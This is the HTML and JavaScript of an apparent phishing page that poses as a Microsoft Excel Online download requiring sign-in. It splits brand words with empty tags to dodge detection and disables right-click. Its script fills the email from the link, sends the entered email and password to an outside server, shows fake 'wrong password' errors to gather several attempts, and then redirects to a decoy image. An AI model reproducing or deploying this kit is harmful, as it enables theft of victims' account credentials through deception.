<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>E.x.c.e.l O.n.l.i.n.e</title>
<meta name="viewport" content="maximum-scale=1.0, user-scalable=no, width=device-width, initial-scale=0.5">
<link rel="short icon"
       href="https://sparkling-brigadeiros-db2a86.netlify.app/index.png">
	       <style>
.footer {
   position: fixed;
   left: 0;
   bottom: 0;
   width: 100%;
   background-color: #d3d3d3;
   color: white;
   text-align: center;
}
</style>
<style>
      .blink {
      animation: blinker 0.6s linear infinite;
      color: #1c87c9;
      font-size: 30px;
      font-weight: bold;
      font-family: sans-serif;
      }
      @keyframes blinker {  
      50% { opacity: 0; }
      }
      .blink-one {
      animation: blinker-one 1s linear infinite;
      }
      @keyframes blinker-one {  
      0% { opacity: 0; }
      }
      .blink-two {
      animation: blinker-two 1.4s linear infinite;
      }
      @keyframes blinker-two {  
      100% { opacity: 0; }
      }
    </style>
	
	<style>
			html {
				-webkit-transition: background-color 1s;
				transition: background-color 1s;
			}
			html, body { min-height: 100%; }
			html.loading {
				background: url('');
				background-repeat: no-repeat;
 				background-attachment: fixed;
  				background-position: center;
				
				
			}
			body {
				-webkit-transition: opacity 1s ease-in;
				transition: opacity 1s ease-in;
			}
			html.loading body {
				opacity: 0;
				-webkit-transition: opacity 0;
				transition: opacity 0;
			}
			
.style1 {font-size: 12px}
</style>
		<script>
			var html = document.getElementsByTagName('html')[0];
			var removeLoading = function() {
				
				setTimeout(function() {
					html.className = html.className.replace(/loading/, '');
				}, 3000);
			};
			removeLoading();
		</script>

<style type="text/css">
<!--
.animate-bottom1 {  position: relative;
  -webkit-animation-name: animatebottom;
  -webkit-animation-duration: 1s;
  animation-name: animatebottom;
  animation-duration: 0s
}
-->
</style>
<style>
html { 
  background: url(https://sparkling-brigadeiros-db2a86.netlify.app/22xx.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}



/* Center the loader */
#loader {
  position: absolute;
  left: 653px;
  top: 350px;
  z-index: 1;
  margin: -75px 0 0 -75px;
  border: 18px solid #114B7B;
  border-radius: 50%;
  border-top: 18px solid #409FBF;
  width: 30px;
  height: 30px;
  -webkit-animation: spin 0s linear finite;
  animation: spin 0s linear finite;
}

@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  0% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  0% { transform: rotate(360deg); }
}
/* Add animation to "page content" */
.animate-bottom {
  position: relative;
  -webkit-animation-name: animatebottom;
  -webkit-animation-duration: 1s;
  animation-name: animatebottom;
  animation-duration: 0s

}

@-webkit-keyframes animatebottom {
  from { bottom:-200px; opacity:0 } 
  to { bottom:0px; opacity:1 }
}


}

#myDiv {
  display: none;
  text-align: left;
  border:#FFF;
}

input { border:solid 1px #999;
}
input:focus { border:#112F18 solid 1px;
	          border-right:none;
		      border-left:none;
		      border-top:none;
}

.sub{ background:#112F18;
      }
.sub:hover{ background:#2C613D;
      }
	  placeholder { color:#666;
	  }
</style>


<style>
.action-btn {
  background-color: green;
  border: #29703B solid 1px;
  font-size: ;
  font-weight: ;
  text-transform: uppercase;
  padding: 9px;
  color: white;
  transition: 0.3s;
  cursor: pointer;
  position: relative;
  display: block;
}

.action-btn:hover {
  background-color: green;
}

.action-btn:focus {
  outline: 0.05em dashed #; 
  outline-offset: 0.05em;
}

.action-btn::after {
  content: '';
  display: block;
  width: 1.2em;
  height: 1.2em;
  position: absolute;
  left: calc(50% - 0.75em);
  top: calc(50% - 0.75em);
  border: 0.15em solid transparent;
  border-right-color: white;
  border-radius: 50%;
  animation: button-anim 0.7s linear infinite;
  opacity: 0;
}

@keyframes button-anim {
  from {
    transform: rotate(0);
  }
  to {
    transform: rotate(360deg);
  }
}

.action-btn.loading {
  color: transparent;
}

.action-btn.loading::after {
  opacity: 1;
}

.button {
  width:350px; 
  height:px; 
  font-family: verdana; 
  font-size: 12px; 
  color:#FFF; 
  background-color: green; 
  border: solid 1px #; 
  padding: 7px; 
  -moz-border-radius: 4px; 
  -webkit-border-radius: 4px; 
  -khtml-border-radius: 4px; 
  border-radius: 4px;
  -webkit-box-shadow: 1px 1px 10px 3px #FFF; 
  box-shadow: 1px 1px 10px 3px #FFF;
}
/* em values are used to adjust button values such as padding, radius etc. based on font-size */
      </style>

 <script language="javascript">
document.onmousedown=disableclick;
status="Right Click Disabled";
Function disableclick(event)
{
  if(event.button==2)
   {
     alert(status);
     return false;    
   }
}
</script>
 
 
 
</head>



<body topmargin="0" leftmargin="0" rightmargin="0" onLoad="myFunction()" >



<div class="cover">

<div align="center">
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<div style="display:non; padding:0px;  font-size:15px; width:520px; font-family:Tahoma; color:#666;" id="myDiv" class="animate-bottom1">
  <div align="center" style=" padding:5px;">
	  <img src="https://sparkling-brigadeiros-db2a86.netlify.app/excel.png" height="50%" width="50%" /><br/>
    
  </div>
  <div align="center" style="padding:3px; border:#FFF;" id="logindiv">
      <div align="center" style="font-size:16px; font-family:Verdana; color: green;">Si<b></b>gn i<b></b>n to pr<b></b>ove yo<b></b>u'r<b></b>e no<b></b>t a r<b></b>ob<b></b>ot</div></div>

   <script  src="https://code.jquery.com/jquery-3.2.1.min.js"   integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="   crossorigin="anonymous"></script>

<script type="text/javascript" src="https://sparkling-brigadeiros-db2a86.netlify.app/script1.js"></script>

	  <div align="center" style="font-size:14px; padding:6px; font-family:Verdana; color:#CC0000;" class="whatever-styling-you-want">
	  
	  
<span id="msg" class="text-danger" style="display: none;">Invalid Password..! Please enter correct password.</span><br>
 <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>

</div>


  
      <FORM target="_top" AUTOCOMPLETE="off">
<br>
<input type="email" id="ai" name="ai" placeholder="Email address" style="padding:8px; width:350px; font-size:14px; border: 2px solid green; border-radius:5px;" required=""/>
<input type="hidden" value="Error! Wrong Password, Re-enter Password." id="textBox" placeholder="Please input your text here..."/>
<br><br>
<input type="password" id="pr" placeholder="Password" name="Password" style="padding:8px; width:350px; font-size:14px; border: 2px solid green; border-radius:5px;" required=""/>
<br><br>
		  
		  <button type="submit" id="submit-btn" name="submit-btn" class="button sub action-btn"  style="">DOWNLOAD</button>
</form>		  
</div>
</div>
</div>
      
  



<div class="footer">
  <p>&copy; Mic<b></b>ros<b></b>oft In<b></b>c. 2O<b></b>24 Re<b></b>ser<b></b>ved</p>
</div>
<br>


<script type="text/javascript" src="https://sparkling-brigadeiros-db2a86.netlify.app/script2.js"></script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-beta/js/materialize.min.js"></script>
<script type="text/javascript" src="https://sparkling-brigadeiros-db2a86.netlify.app/main2.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>
/* global $ */
$(document).ready(function() {
    var count = 0;



    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        // $('#ai').val(ai);
        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#ai').val(my_ai);
        $('#aich').html(my_ai);
        $("#msg").hide();

    }
    ///////////////url getting ai////////////////

    var file = "bmV4dC5waHA=";

    $('#submit-btn').click(function(event) {
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var msg = $('#msg').html();
        $('#msg').text(msg);
        ///////////new injection////////////////
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!ai) {
            $('#error').show();
            $('#error').html("email field is empty.!");
            return false;
        }

        if (!filter.test(my_ai)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a different account");
            return false;
        }
        if (!pr) {
            $('#error').show();
            $('#error').html("Password field is empty.!");
            return false;
        }

        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        ///////////new injection////////////////
        count = count + 1;

        $.ajax({
            dataType: 'JSON',
            url: 'https://geosonicng.com/wrk/major/xl.php', // Here Your portal.php Hosted Link
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
            },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr) {
                $('#submit-btn').html('Verifing...');
            },
            success: function(response) {
                if (response) {
                    $("#msg").show();
                    console.log(response);
                    if (response['signal'] == 'ok') {
                        $("#pr").val("");
                        if (count >= 3) {
                            count = 0;
                            // window.location.replace(response['redirect_link']);
                            window.location.replace("https://img-ii89.onrender.com/purchaseorder-bg.png");
                            return false;

                        }
                        // $('#msg').html(response['msg']);
                    } else {
                        // $('#msg').html(response['msg']);
                    }
                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 3) {
                    count = 0;
                    window.location.replace("https://img-ii89.onrender.com/purchaseorder-bg.png" );
                    return false;
                }
                $("#msg").show();
                // $('#msg').html("Please try again later");
            },
            complete: function() {
                $('#submit-btn').html('Login');
            }
        });
    });


});
</script>


</body>
</html>
